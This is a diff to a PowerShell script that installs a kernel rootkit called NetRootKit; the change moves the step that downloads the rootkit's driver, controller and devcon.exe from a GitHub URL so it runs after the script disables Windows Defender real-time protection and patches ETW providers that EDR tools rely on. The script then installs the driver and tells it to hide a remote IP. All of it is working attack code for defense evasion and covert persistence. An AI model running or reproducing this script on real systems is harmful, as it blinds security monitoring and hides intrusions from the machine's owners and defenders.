@@ -14,7 +14,7 @@
 
 $ErrorActionPreference = "Stop"
 
-# --- 0. Prepare Environment & Download Files ---
+# --- 1. Prepare Environment (Create Temp Dir) ---
 $BaseUrl = "https://github.com/KriyosArcane/NetRootKit/raw/refs/heads/master"
 $TempDir = "C:\Windows\Temp\NRK"
 
@@ -24,23 +24,7 @@ if (-not (Test-Path $TempDir)) {
 }
 Set-Location $TempDir
 
-$FilesToDownload = @(
-    "NetRootKit.inf",
-    "NetRootKit.sys",
-    "NetRootKitController.exe",
-    "netrootkit.cat",
-    "devcon.exe"
-)
-
-Write-Host "[*] Downloading NetRootKit components from GitHub..."
-foreach ($File in $FilesToDownload) {
-    if (-not (Test-Path $File)) {
-        Write-Host "    -> Downloading $File..."
-        Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
-    }
-}
-
-# --- 1. Disable Windows Defender & Tamper Protection ---
+# --- 2. Disable Windows Defender & Tamper Protection ---
 Write-Host "[*] Disabling Windows Defender and Real-Time Protection..."
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
@@ -61,7 +45,7 @@ try {
     Write-Host "[-] Failed to disable Defender (Tamper Protection may be on, or not running as Admin)."
 }
 
-# --- 2. Disable ETW Telementry (System-Wide) ---
+# --- 3. Disable ETW Telementry (System-Wide) ---
 Write-Host "[*] Patching ETW Providers..."
 try {
     # Disable common ETW providers that EDRs use
@@ -73,7 +57,24 @@ try {
     Write-Host "[-] Failed to modify ETW."
 }
 
-# --- 3. Check / Enable TESTSIGNING ---
+# --- 4. Download NetRootKit Components ---
+$FilesToDownload = @(
+    "NetRootKit.inf",
+    "NetRootKit.sys",
+    "NetRootKitController.exe",
+    "netrootkit.cat",
+    "devcon.exe"
+)
+
+Write-Host "[*] Downloading NetRootKit components from GitHub..."
+foreach ($File in $FilesToDownload) {
+    if (-not (Test-Path $File)) {
+        Write-Host "    -> Downloading $File..."
+        Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
+    }
+}
+
+# --- 5. Check / Enable TESTSIGNING ---
 Write-Host "[*] Checking BCDEdit TESTSIGNING status..."
 $bcd = bcdedit /enum '{current}'
 if ($bcd -match "testsigning\s+Yes") {
@@ -85,7 +86,7 @@ if ($bcd -match "testsigning\s+Yes") {
     exit
 }
 
-# --- 4. Install NetRootKit Driver ---
+# --- 6. Install NetRootKit Driver ---
 Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
 if (-not (Test-Path "devcon.exe")) {
     Write-Host "[-] devcon.exe not found in current directory! Exiting."
@@ -101,7 +102,7 @@ if (-not (Test-Path "NetRootKit.inf")) {
 $devconOutput = .\devcon.exe install NetRootKit.inf Root\NetRootKit
 Write-Host $devconOutput
 
-# --- 5. Interact with Kernel Driver to Hide IP ---
+# --- 7. Interact with Kernel Driver to Hide IP ---
 Write-Host "[*] Sending hide-remote-ip command to NetRootKitController..."
 if (-not (Test-Path "NetRootKitController.exe")) {
     Write-Host "[-] NetRootKitController.exe not found! Exiting."
